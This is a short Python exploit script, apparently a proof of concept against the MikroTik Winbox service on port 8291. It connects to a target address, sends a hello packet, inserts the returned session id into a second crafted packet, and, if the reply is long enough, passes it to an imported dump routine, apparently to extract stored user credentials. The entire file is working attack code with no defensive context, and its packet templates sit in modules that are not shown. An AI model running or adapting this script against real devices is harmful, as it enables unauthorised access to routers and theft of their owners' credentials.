import socket
import sys

from bytes import BYTE_A, BYTE_B
from extract_user import dump

if __name__ == '__main__':
    if (
        len(sys.argv) < 2
        or (len(sys.argv) == 3 and not str.isdigit(sys.argv[2]))
        or len(sys.argv) > 3
    ):
        print('Usage: python3 WinboxExploit.py IP_ADDRESS [PORT]')
        exit()

    ip = sys.argv[1]
    port = 8291
    if len(sys.argv) == 3:
        port = int(sys.argv[2])

    # Initialize Socket
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((ip, port))
    except Exception as e:
        print('Connection error: ' + str(e))
        exit()

    # Convert to bytearray for manipulation
    a = bytearray(BYTE_A)
    b = bytearray(BYTE_B)

    # Send hello and recieve the sesison id
    s.send(a)
    try:
        d = bytearray(s.recv(1024))
    except Exception as e:
        print('Connection error: ' + str(e))
        exit()

    # Replace the session id in template
    b[19] = d[38]

    # Send the edited response
    s.send(b)
    d = bytearray(s.recv(1024))

    # Get results
    print('Connected to ' + ip + ':' + str(port))
    if len(d[55:]) > 25:
        print('Exploit successful\n')
        dump(d[55:])
    else:
        print('Exploit failed')
